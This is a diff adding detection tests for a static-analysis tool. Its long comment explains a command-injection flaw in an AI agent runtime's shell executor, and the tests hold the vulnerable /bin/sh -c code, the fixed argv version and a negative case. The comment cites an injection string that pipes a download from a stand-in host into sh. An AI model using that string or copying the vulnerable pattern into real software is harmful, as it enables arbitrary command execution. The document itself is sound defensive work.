@@ -1,0 +1,312 @@
+# Rank 1435 / CVE-2026-54051 (jovancoding/network-ai, GHSA-qw6v-5fcf-5666,
+# CWE-78): network-ai is a small TypeScript multi-agent runtime. `lib/agent-runtime.ts`
+# gives an agent a shell tool through two classes. `SandboxPolicy.isCommandAllowed`
+# decides whether a command string may run at all -- a blocklist first, then a
+# glob allowlist whose entries are scoped prefixes such as `git *` or `npm run *`.
+# `ShellExecutor.execute` calls that check and then hands the *same string* to
+# `spawnCommand`, which ran it like this at the parent:
+#
+#   const isWindows = process.platform === 'win32';
+#   const shell = isWindows ? 'cmd.exe' : '/bin/sh';
+#   const shellArgs = isWindows ? ['/c', command] : ['-c', command];
+#
+#   const child = spawn(shell, shellArgs, { cwd, env, stdio: [...], windowsHide: true });
+#
+# The weakness in one sentence: the allowlist judges a flat string, and the
+# string is then executed by a shell that reparses it. `git log; curl evil.sh |
+# sh` matches the `git *` entry, and `/bin/sh -c` runs both halves. Everything
+# the allowlist is for -- scoping an agent to `git`, to `npm run`, to `ls` -- is
+# undone by one `;`, `|`, `&&`, `$(...)`, a backtick, a redirection or a newline,
+# because none of those characters is what the allowlist looks at. In this
+# runtime the command string is what an LLM or a peer agent asked for, so the
+# reachable state is arbitrary command execution as the runtime's user.
+#
+# 379f77656b578144e03415c5b134d8309a4b5792 ("fix: v5.9.1 -- GHSA-qw6v-5fcf-5666
+# shell command injection ... + permission_denied audit logging") stops using a
+# shell. It adds `parseCommandLine`, which tokenises the string into an argv
+# honouring quotes and reports whether any of `; & | $ ` ( ) < > { } \n \r`
+# appeared outside quotes; `isCommandAllowed` rejects such a command before
+# pattern matching; and `spawnCommand` becomes
+#
+#   const argv = this.policy.tokenizeCommand(command);
+#   ...
+#   const child = spawn(argv[0]!, argv.slice(1), { ..., shell: false });
+#
+# so no string is handed to an interpreter at all. The commit is informal and
+# carries two unrelated changes beside the fixing change -- a version bump across sixteen
+# documentation files, and a `_deny` helper in `scripts/check_permission.py`
+# that logs a `permission_denied` audit event on each denial path. Neither is
+# the CVE.
+#
+# The pool row is flagged `nocommit` and the flag is wrong for the eleventh
+# time, this time in the plainest way available: `git clone` followed by
+# `git show 379f77656b` prints the full diff on the first try, single parent,
+# no merge, no preview ref. The vulnerable `spawn(shell, shellArgs)` is present
+# at `<fix>^` and the `shell: false` argv form is present at `<fix>`. Nothing
+# is reconstructed. The recorded CWE-78 is right.
+#
+# What fires without this, and why it is not coverage. `timeout 180
+# ./bin/vyql scan --cache off --max-ram 6GB` over the whole repository reported
+# 786 findings at the parent, among them a CRITICAL VYQL-INJ-002 whose sink is
+# `code.CommandExecution @ lib/agent-runtime.ts:431` -- the vulnerable `spawn`
+# line itself, reached by a 40-hop taint path through
+# `ShellExecutor.execute#param#command`. It looks like coverage and is not: the
+# *patched* revision reports the identical row at `lib/agent-runtime.ts:549`,
+# because `command` still flows into `spawn(argv[0], argv.slice(1))`. The taint
+# route cannot tell an argv execution from a shell-string execution, so it
+# scores the remediation exactly as it scores the defect. 786 findings and 334
+# at-or-above-high on both revisions, unchanged.
+#
+# The discriminating fact is the one the fixed revision deletes: a shell interpreter named
+# as the program, with the shell's command-string flag as its first argument.
+# `spawn('/bin/sh', ['-c', s])` and `spawn('cmd.exe', ['/c', s])` are the
+# documented spelling of "run this string through a shell" -- Node's own
+# `child_process` documentation contrasts them with `spawn(file, args)` and with
+# `shell: true` -- so a binding naming them is written from the library's
+# documentation, not from this commit. Nothing in it mentions `parseCommandLine`,
+# `tokenizeCommand`, `SHELL_METACHARACTERS` or any other name the fixed revision
+# introduced; renaming all four leaves the result unchanged.
+#
+# `commandStringWrapperExecution1035` (vyql/bindings/javascript/mfb63017a.vyql,
+# appended at end of file) reuses `code.CommandStringWrapperExecution` -- whose
+# review condition reads "a command execution wrapper receives one
+# formatted shell command string instead of an argv array" -- rather than
+# minting anything: VYQL-INJ-119 consumes it at CRITICAL/CWE-78 and
+# VYQL-VAL-005 consumes it too, so it is not one of the inert concepts.
+# Considered and rejected: `code.CommandAllowlistBeforeParsing`, whose evidence
+# text is written for Go's `strings.Split`/`runner.ParseCommand` pair and whose
+# allowlist half is in a sibling method the fixed revision does not touch, so it cannot
+# discriminate; `code.DynamicCommandExec`, which is about assembling a string
+# and would fire on both revisions; and a new sibling concept, which is what
+# AGENTS.md calls ontology rot.
+#
+# Two engine facts the binding is shaped around, both re-measured here. The
+# shell binary and the flag reach the function context as `literal:` tokens even
+# though neither appears in the `spawn` call's own arguments -- JS emits no
+# call-argument tokens at all (1360, 1388), so the ternaries that build `shell`
+# and `shellArgs` are the only route. And `node.context.literal in [...]` is
+# exact-token equality, not the substring match `containsAny` performs: a list
+# of `["sh", "bash"]` matched n8n's `spawn('sh', ['-c', command], ...)` and did
+# *not* match this file's `'/bin/sh'`, which is why both spellings are listed.
+# The flag clause has to be exact for the same reason in the other direction --
+# `contains "-c"` would match `--color`, `utf-8-check` and every other literal
+# with those two characters in it.
+#
+# Discrimination, over three `--cache off` runs of each revision: the whole
+# repository reports 790 findings and 338 at-or-above-high at the parent against
+# 786/334 at the fixed revision, identical across all three runs. The delta is exactly this
+# rank's: 2 VYQL-INJ-119 CRITICAL and 2 VYQL-VAL-005 rows on
+# `lib/agent-runtime.ts`, 0 of each at the fixed revision. The pair of rows for one defect
+# is the known JS nested-lambda artifact (1412, 1414): `spawnCommand` returns
+# `new Promise((resolve, reject) => {...})`, and the outer function context
+# inherits the inner lambda's tokens, so the same fact is attributed at
+# `spawnCommand` and again at the lambda.
+#
+# Reach, measured rather than assumed, and the zero is near-vacuous. Across the
+# 177 clones under /tmp/cve-work/rank*/ , 171 JavaScript/TypeScript files
+# contain a `spawn`/`spawnSync` call at all; **7** of those also carry both a
+# shell-binary literal and a `-c`/`/c` literal, which is the shape's entire
+# reachable set. Two of the 7 are this rank's own target and repro. Of the
+# remaining 5, four are vendored yarn release bundles
+# (`.yarn/releases/yarn-4.0.2.cjs`, `yarn-4.6.0.cjs`, and two copies of
+# `yarn-4.12.0.cjs` under mlflow) which flag 2 each -- yarn's own
+# `/bin/sh -c` wrapper, which *does* shell-quote each operand with
+# `.replace(/'/g, "'\\''")`, so those are the precision cost and are reported as
+# such rather than hidden; and one is n8n's
+# `packages/@n8n/computer-use/src/tools/shell/sandbox.ts`, whose `spawnShell`
+# runs `spawn('sh', ['-c', command], { cwd })` on an LLM-supplied command and
+# flags once. That one is the same weakness class deliberately, mitigated by
+# sandboxing rather than by argv execution -- rank 1383's point that isolation
+# limits blast radius without stopping the payload. So: the shape is rare in
+# this corpus, not proven precise by it.
+#
+# The third case below is the one that is not vacuous. It spawns the same
+# `/bin/bash` binary from the same function and is declined, because the
+# argument is a script path and not the shell's command-string flag. That is
+# what shows the binding keys on shell-string execution rather than on the name
+# of a shell.
+
+test "rank1435: the agent shell executor runs an allowlisted command string through /bin/sh -c"
+  lang javascript
+  file lib/agent-runtime.ts
+  expect VYQL-INJ-119
+  expect_review code.CommandStringWrapperExecution
+  code
+  ```
+  import { spawn } from 'child_process';
+
+  export class ShellExecutor {
+    private policy: SandboxPolicy;
+    private activeProcesses = 0;
+
+    constructor(policy: SandboxPolicy) {
+      this.policy = policy;
+    }
+
+    /** Execute a shell command within policy constraints */
+    async execute(command: string, opts: ShellOptions = {}): Promise<ShellResult> {
+      if (!this.policy.isCommandAllowed(command)) {
+        throw new RuntimePolicyError(`Command blocked by policy: ${command}`);
+      }
+
+      const cwd = opts.cwd
+        ? (this.policy.resolvePath(opts.cwd) ?? this.policy.basePath)
+        : this.policy.basePath;
+
+      this.activeProcesses++;
+      try {
+        return await this.spawnCommand(command, cwd, this.policy.defaultTimeoutMs, 65536, opts.env);
+      } finally {
+        this.activeProcesses--;
+      }
+    }
+
+    private spawnCommand(
+      command: string,
+      cwd: string,
+      timeoutMs: number,
+      maxBytes: number,
+      env?: Record<string, string>,
+    ): Promise<ShellResult> {
+      return new Promise((resolvePromise, reject) => {
+        const isWindows = process.platform === 'win32';
+        const shell = isWindows ? 'cmd.exe' : '/bin/sh';
+        const shellArgs = isWindows ? ['/c', command] : ['-c', command];
+
+        const child = spawn(shell, shellArgs, {
+          cwd,
+          env: env ? { ...process.env, ...env } : process.env,
+          stdio: ['ignore', 'pipe', 'pipe'],
+          windowsHide: true,
+        });
+
+        const timer = setTimeout(() => {
+          child.kill('SIGTERM');
+        }, timeoutMs);
+
+        child.on('close', (code) => {
+          clearTimeout(timer);
+          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
+        });
+      });
+    }
+  }
+  ```
+
+test "rank1435: the same executor tokenising the command into an argv and spawning it without a shell"
+  lang javascript
+  file lib/agent-runtime.ts
+  reject VYQL-INJ-119
+  reject_review code.CommandStringWrapperExecution
+  code
+  ```
+  import { spawn } from 'child_process';
+
+  export class ShellExecutor {
+    private policy: SandboxPolicy;
+    private activeProcesses = 0;
+
+    constructor(policy: SandboxPolicy) {
+      this.policy = policy;
+    }
+
+    /** Execute a shell command within policy constraints */
+    async execute(command: string, opts: ShellOptions = {}): Promise<ShellResult> {
+      if (!this.policy.isCommandAllowed(command)) {
+        throw new RuntimePolicyError(`Command blocked by policy: ${command}`);
+      }
+
+      const cwd = opts.cwd
+        ? (this.policy.resolvePath(opts.cwd) ?? this.policy.basePath)
+        : this.policy.basePath;
+
+      this.activeProcesses++;
+      try {
+        return await this.spawnCommand(command, cwd, this.policy.defaultTimeoutMs, 65536, opts.env);
+      } finally {
+        this.activeProcesses--;
+      }
+    }
+
+    private spawnCommand(
+      command: string,
+      cwd: string,
+      timeoutMs: number,
+      maxBytes: number,
+      env?: Record<string, string>,
+    ): Promise<ShellResult> {
+      return new Promise((resolvePromise, reject) => {
+        const argv = this.policy.tokenizeCommand(command);
+        if (!argv || argv.length === 0) {
+          reject(new RuntimePolicyError(
+            `Command rejected — shell metacharacters are not permitted: ${command}`,
+          ));
+          return;
+        }
+        const file = argv[0]!;
+        const args = argv.slice(1);
+
+        const child = spawn(file, args, {
+          cwd,
+          env: env ? { ...process.env, ...env } : process.env,
+          stdio: ['ignore', 'pipe', 'pipe'],
+          windowsHide: true,
+          shell: false,
+        });
+
+        const timer = setTimeout(() => {
+          child.kill('SIGTERM');
+        }, timeoutMs);
+
+        child.on('close', (code) => {
+          clearTimeout(timer);
+          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
+        });
+      });
+    }
+  }
+  ```
+
+test "rank1435: a runner that spawns the shell binary to execute a script file rather than a command string"
+  lang javascript
+  file lib/script-runner.ts
+  reject VYQL-INJ-119
+  reject_review code.CommandStringWrapperExecution
+  code
+  ```
+  import { spawn } from 'child_process';
+
+  export class ScriptRunner {
+    private policy: SandboxPolicy;
+
+    constructor(policy: SandboxPolicy) {
+      this.policy = policy;
+    }
+
+    runScript(scriptPath: string, args: string[], cwd: string, timeoutMs: number): Promise<ShellResult> {
+      return new Promise((resolvePromise, reject) => {
+        const resolved = this.policy.resolvePath(scriptPath);
+        if (!resolved) {
+          reject(new RuntimePolicyError(`Script outside sandbox: ${scriptPath}`));
+          return;
+        }
+
+        const child = spawn('/bin/bash', [resolved, ...args], {
+          cwd,
+          env: process.env,
+          stdio: ['ignore', 'pipe', 'pipe'],
+          windowsHide: true,
+        });
+
+        const timer = setTimeout(() => {
+          child.kill('SIGTERM');
+        }, timeoutMs);
+
+        child.on('close', (code) => {
+          clearTimeout(timer);
+          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
+        });
+      });
+    }
+  }
+  ```
